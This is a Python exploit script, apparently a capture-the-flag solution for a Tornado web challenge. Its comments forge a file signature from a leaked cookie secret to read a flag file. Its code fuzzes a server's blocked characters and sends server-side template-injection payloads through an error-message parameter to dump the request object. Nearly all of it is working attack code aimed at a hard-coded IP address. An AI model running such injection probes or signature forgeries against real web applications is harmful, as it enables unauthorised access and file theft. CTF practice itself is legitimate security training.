# flag.txt
# /fllllllllllag
# filename=flag.txt&signature=003b6389a6858b5a6a5b58535f648cda

# hint.txt
# md5(cookie_secret + md5(filename))
# file?filename=hint.txt&signature=b0f2d51b85b7368c3793452737d210dd

# Orz.txt
# render()
# file?filename=Orz.txt&signature=24785b461222181e17b83badf8233d32

# cookie_secret
# md5('M)Z.>}{O]lYIp(oW7$dc132uDaK<C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r' + md5('/fllllllllllag'))

import requests as req

URL = 'http://49.4.79.1:32132/'
SSTITEST = URL+'error?msg={{123^321}} test'
SSTI = URL+'error?msg='

# 34 ",37 %,39 ',40 (,41 ),42 *,45 -,47 /,61 =,91 [,92 \,93 ],95 _,124 |
# "'%()[]+-*/\=_|
# os import


def getTest(x):
    res = req.get("%svvvvv%skkkkk" % (SSTITEST, chr(x)))
    if res.status_code == 200 and b'testvvvvv' not in res.content:
        print("%d-%c" % (x, x), end=",")

# http://49.4.79.1:32132/error?msg={{request}}


def getSSTI(pl):
    headers = {
        "V": "vvv"
    }
    res = req.get(SSTI + pl, headers=headers)
    if res.status_code == 200:
        print(res.content.decode('utf-8'))


if __name__ == '__main__':
    pl = '%0d%0a{{escape request}}'
    getSSTI(pl)
    # for i in range(255):
    #     getTest(i)
